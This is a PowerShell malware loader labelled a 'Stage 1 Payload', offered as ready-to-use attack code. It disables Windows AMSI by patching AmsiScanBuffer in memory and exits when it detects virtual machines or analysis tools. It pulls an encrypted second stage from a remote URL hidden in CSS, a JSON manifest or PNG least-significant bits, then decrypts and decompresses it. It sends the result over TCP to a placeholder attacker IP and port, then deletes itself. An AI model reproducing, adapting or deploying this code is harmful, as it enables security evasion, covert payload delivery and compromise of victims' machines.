# === Stage 1 PowerShell Payload — Stealth 2025 + AES-Zlib-SHA256 Support ===

# 🛡 AMSI Unhook
$src = @"
using System;
using System.Runtime.InteropServices;
public class Bypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
}
"@
Add-Type $src
$p = [Bypass]::GetProcAddress([Bypass]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
[Bypass]::VirtualProtect($p, [uint32]5, 0x40, [ref]0) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $p, 1)

# 🕵️ Anti-VM & Analysis
try {
    $m = (Get-WmiObject Win32_ComputerSystem).Manufacturer
    $r = (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize
    if ($m -match "VMware|VirtualBox|KVM|Xen") { exit }
    if ($r -lt 4000000) { exit }
    $susp = "vbox","wireshark","fiddler","sandboxie","ollydbg","procmon","ida","x96dbg"
    $p = Get-Process | Select -Expand Name
    foreach ($x in $susp) { if ($p -contains $x) { exit } }
} catch {}

# 📦 Extract payload
$delivery = "REPLACE_DELIVERY"
$url = "REPLACE_URL"
$e = ""

switch ($delivery) {
  "css" {
    $m = Invoke-WebRequest $url -UseBasicParsing
    $match = [Regex]::Match($m.Content, 'content:\s*"([^"]+)"')
    if ($match.Success) { $e = $match.Groups[1].Value } else { exit }
  }
  "manifest" {
    $j = Invoke-RestMethod $url
    if ($j.payload) { $e = $j.payload } else { exit }
  }
  "png" {
    Add-Type -AssemblyName System.Drawing
    $img = [System.Drawing.Image]::FromStream((Invoke-WebRequest $url).RawContentStream)
    $img = New-Object System.Drawing.Bitmap $img
    $bits = ""
    for ($y=0; $y -lt $img.Height; $y++) {
      for ($x=0; $x -lt $img.Width; $x++) {
        $pix = $img.GetPixel($x, $y)
        $bits += ($pix.R -band 1)
        $bits += ($pix.G -band 1)
        $bits += ($pix.B -band 1)
      }
    }
    $bytes = @()
    for ($i=0; $i -lt $bits.Length; $i+=8) {
      $bytes += [Convert]::ToByte($bits.Substring($i,8),2)
    }
    $len = [BitConverter]::ToInt32($bytes, 0)
    $payloadBytes = $bytes[4..(3+$len)]
    $e = [System.Text.Encoding]::UTF8.GetString($payloadBytes)
  }
  default { exit }
}

# 🔐 AES Decrypt and decompress
$sp = $e -split ':'
$iv = [byte[]]@()
for ($i = 0; $i -lt $sp[0].Length; $i+=2) {
  $iv += [Convert]::ToByte($sp[0].Substring($i,2),16)
}
$cb = [Convert]::FromBase64String($sp[1])

$key = [Convert]::FromHexString("REPLACE_KEY")
$aes = New-Object Security.Cryptography.AesManaged
$aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'; $aes.Key = $key; $aes.IV = $iv
$dec = $aes.CreateDecryptor()
$ms = New-Object IO.MemoryStream(,$cb)
$cs = New-Object Security.Cryptography.CryptoStream($ms,$dec,'Read')
$bs = New-Object IO.BinaryReader($cs)
$data = $bs.ReadBytes(1000000)

# ✅ Verify SHA256
$hash = $data[0..31]
$zdata = $data[32..($data.Length-1)]
$unzip = New-Object IO.Compression.DeflateStream([IO.MemoryStream]::new($zdata), [IO.Compression.CompressionMode]::Decompress)
$ms_out = New-Object IO.MemoryStream
$unzip.CopyTo($ms_out)
$stage2 = [System.Text.Encoding]::UTF8.GetString($ms_out.ToArray())
$actualHash = [System.Security.Cryptography.SHA256]::Create().ComputeHash($ms_out.ToArray())
if (-not ($hash -ceq $actualHash)) { exit }

# 💣 TCP exfil shell (no TCPClient object)
Add-Type @"
using System;
using System.Net.Sockets;
using System.IO;
public class RS {
    public static void Run(string host, int port, string payload) {
        var c = new TcpClient(host, port);
        var s = c.GetStream();
        var w = new StreamWriter(s); w.AutoFlush = true;
        var r = new StringReader(payload);
        string line; while ((line = r.ReadLine()) != null) { w.WriteLine(line); }
        w.Close(); c.Close();
    }
}
"@

[RS]::Run("REPLACE_IP", REPLACE_PORT, $stage2)

# 🧹 Self-delete
try {
  Remove-Item $MyInvocation.MyCommand.Path -Force
} catch {}
